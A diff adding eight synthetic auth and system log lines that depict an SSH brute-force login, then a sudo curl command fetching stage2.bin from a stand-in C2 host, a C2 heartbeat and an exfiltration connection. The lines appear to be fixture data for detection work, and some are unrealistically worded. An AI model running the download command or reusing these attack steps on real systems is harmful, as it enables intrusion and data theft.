@@ -1,0 +1,8 @@
+2026-10-14 02:11:05 server-dmz-01 sshd[14022]: Failed password for invalid user admin from 198.51.100.45 port 49152 ssh2
+2026-10-14 02:11:08 server-dmz-01 sshd[14025]: Failed password for invalid user root from 198.51.100.45 port 49154 ssh2
+2026-10-14 02:11:12 server-dmz-01 sshd[14028]: Failed password for invalid user deploy from 198.51.100.45 port 49158 ssh2
+2026-10-14 02:11:19 server-dmz-01 sshd[14035]: Accepted password for service_svc from 198.51.100.45 port 49160 ssh2
+2026-10-14 02:11:22 server-dmz-01 sudo[14040]: service_svc : TTY=pts/0 ; PWD=/home/service_svc ; USER=root ; COMMAND=/usr/bin/curl -O http://malicious-c2-update.xyz/stage2.bin
+2026-10-14 02:11:25 server-dmz-01 systemd[1]: Started suspicious background cron worker for payload execution
+2026-10-14 02:11:30 server-dmz-01 payload[14050]: C2 connection established to https://c2-collector.darkthreats.top/api/heartbeat
+2026-10-14 02:12:00 server-dmz-01 sshd[14070]: Exfiltration socket opened to 203.0.113.88:443
